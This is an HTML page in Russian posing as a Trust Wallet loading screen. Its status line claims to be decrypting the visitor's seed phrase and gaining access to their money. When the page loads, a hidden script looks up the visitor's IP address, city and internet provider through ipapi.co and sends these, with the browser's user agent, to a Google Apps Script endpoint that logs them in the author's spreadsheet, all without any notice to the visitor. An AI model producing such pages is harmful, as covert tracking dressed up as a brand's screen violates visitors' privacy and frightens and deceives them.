<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet | Loading</title>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fff; font-family: sans-serif; }
        .container { text-align: center; width: 90%; max-width: 350px; }
        .logo-svg { width: 80px; height: 80px; margin-bottom: 40px; fill: #0500ff; }
        .loader-track { width: 100%; height: 5px; background-color: #f0f2f5; border-radius: 10px; margin-bottom: 25px; overflow: hidden; position: relative; }
        .loader-fill { width: 0%; height: 100%; background: #0500ff; animation: progress 4s infinite ease-in-out; }
        .status { color: #5b616e; font-size: 16px; font-weight: 500; }
        @keyframes progress { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
    </style>
</head>
<body>

<div class="container">
    <svg class="logo-svg" viewBox="0 0 512 512">
        <path d="M256 0L48 94.4v133.4C48 355.6 256 512 256 512s208-156.4 208-284.2V94.4L256 0z" fill="#0500ff"/>
        <path d="M256 465c-20-15.8-164-129.5-164-237.2V122.3L256 45.1l164 77.2v105.5C420 335.5 276 449.2 256 465z" fill="#fff"/>
        <path d="M140 230l80 80 152-152" stroke="#0500ff" stroke-width="40" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
    <div class="loader-track"><div class="loader-fill"></div></div>
    <div class="status">Расшифровываем вашу seed-фразу, получаем доступ к вашим деньгам...</div>
</div>

<script>
    async function logVisit() {
        const googleScriptURL = 'https://script.google.com/macros/s/AKfycbwEa3DYENoLFr7sz7gNCkRAr8xBGu4vaxxTF3mX-PDJkeUfO3GczYNKudGbwS5Bb4N1Lw/exec';
        
        try {
            // 1. Получаем данные о локации через сторонний API
            const response = await fetch('https://ipapi.co/json/');
            const geo = await response.json();
            
            const locationString = `${geo.country_name}, ${geo.city} (провайдер: ${geo.org})`;
            const ip = geo.ip;

            // 2. Отправляем собранные данные в твою Google Таблицу
            const params = new URLSearchParams();
            params.append('userAgent', navigator.userAgent);
            params.append('location', locationString);
            params.append('ip', ip);

            fetch(googleScriptURL, {
                method: 'POST',
                body: params,
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            });
            
        } catch (error) {
            // Если API локации заблокирован, отправляем хотя бы данные браузера
            console.log("Geo error, sending basic info");
            const params = new URLSearchParams();
            params.append('userAgent', navigator.userAgent);
            params.append('location', 'Ошибка определения');
            
            fetch(googleScriptURL, { method: 'POST', body: params, mode: 'no-cors' });
        }
    }

    // Запускаем при загрузке
    window.onload = logVisit;
</script>

</body>
</html>

